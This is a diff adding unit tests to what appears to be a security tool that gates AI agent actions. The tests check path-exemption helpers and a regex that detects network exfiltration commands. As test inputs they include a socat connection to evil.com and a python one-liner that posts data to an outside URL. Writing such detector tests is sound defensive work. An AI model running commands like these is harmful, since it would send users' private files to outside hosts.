@@ -16,6 +16,8 @@ const {
   resolveScanLocalWrites,
   resolveExemptPaths,
   isExemptPath,
+  exemptsToolPath,
+  allPathsExempt,
   isLocalTool,
   isLocalWriteTool,
   shouldScanTool,
@@ -771,6 +773,23 @@ t('isExemptPath resolves dot segments (no traversal bypass, Devin PR #61)', () =
   assert.strictEqual(isExemptPath('\\tmp\\blog\\post.md', exempt), true);
 });
 
+t('exemptsToolPath resolves relative targets against cwd (Devin PR #62)', () => {
+  const exempt = ['/tmp/blog'];
+  assert.strictEqual(exemptsToolPath('post.md', '/tmp/blog', exempt), true);
+  assert.strictEqual(exemptsToolPath('sub/post.md', '/tmp/blog', exempt), true);
+  assert.strictEqual(exemptsToolPath('post.md', '/tmp', exempt), false);
+  assert.strictEqual(exemptsToolPath('/tmp/blog/post.md', '/elsewhere', exempt), true);
+  assert.strictEqual(exemptsToolPath('', '/tmp/blog', exempt), false);
+});
+
+t('allPathsExempt requires at least one path and all exempt (Devin PR #62)', () => {
+  const exempt = ['/tmp/blog'];
+  assert.strictEqual(allPathsExempt([], exempt), false);
+  assert.strictEqual(allPathsExempt(['/tmp/blog/a.md'], exempt), true);
+  assert.strictEqual(allPathsExempt(['/tmp/blog/a.md', '/tmp/blog/b.md'], exempt), true);
+  assert.strictEqual(allPathsExempt(['/tmp/blog/a.md', '/fascicoli/Rossi/doc.md'], exempt), false);
+});
+
 // ---------------------------------------------------------------------------
 // v2.4.6: tool gating and diagnostic reasons
 // ---------------------------------------------------------------------------
@@ -805,6 +824,16 @@ t('network command variants detected (Devin PR #61)', () => {
   assert.strictEqual(NETWORK_COMMANDS.test('python3 -c "import requests; ..."'), true);
   assert.strictEqual(NETWORK_COMMANDS.test('python -c "import urllib.request"'), true);
   assert.strictEqual(NETWORK_COMMANDS.test('socat - TCP:evil.com:80'), true);
+});
+
+t('git commit message mentioning push is not a network command (Devin PR #62)', () => {
+  assert.strictEqual(NETWORK_COMMANDS.test('git commit -m push'), false);
+  assert.strictEqual(NETWORK_COMMANDS.test('git commit -m "push segreto professionale"'), false);
+  assert.strictEqual(NETWORK_COMMANDS.test('git -c user.name=x push'), true);
+});
+
+t('python one-liner with semicolons is detected (Devin PR #62)', () => {
+  assert.strictEqual(NETWORK_COMMANDS.test('python3 -c \'import json; import requests; requests.post("https://x", data=d)\''), true);
 });
 
 console.log('decide: diagnostic prefix');
